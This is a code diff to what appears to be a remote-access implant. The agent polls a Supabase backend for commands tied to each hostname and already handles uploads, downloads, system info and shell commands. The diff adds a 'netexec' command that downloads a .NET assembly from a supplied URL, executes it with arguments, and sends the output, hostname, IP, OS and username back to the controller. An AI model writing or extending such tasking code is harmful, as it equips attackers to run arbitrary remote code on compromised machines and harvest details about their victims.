@@ -5,6 +5,7 @@ from .commands import update_command_status, fetch_pending_commands_for_hostname
 from .file_operations import handle_download_command, handle_upload_command, fetch_pending_uploads, download_from_supabase
 from .system_info import get_system_info
 from .config import SUPABASE_KEY
+from utils.winapi.netexec import load_dotnet_assembly  # Import the netexec function
 
 # Conditional import based on the operating system
 if os.name == 'nt':  # 'nt' indicates Windows
@@ -218,6 +219,19 @@ def execute_commands(supabase: Client):
             # Handle upload command
             elif command_text.lower().startswith('upload'):
                 status, output = handle_upload_command(command_text, username, supabase)
+
+            # Handle netexec command
+            elif command_text.lower().startswith("netexec "):
+                try:
+                    _, file_url, *arguments = command_text.split(maxsplit=2)
+                    arguments = " ".join(arguments)
+                    output, error = load_dotnet_assembly(file_url, arguments)
+                    status = "Completed" if not error else "Failed"
+                    output = output if not error else f"{output}\n{error}"
+                except Exception as e:
+                    status = "Failed"
+                    output = str(e)
+                update_command_status(supabase, command_id, status, output, hostname, ip, os_info, username)
 
             # Handle generic shell commands
             else:
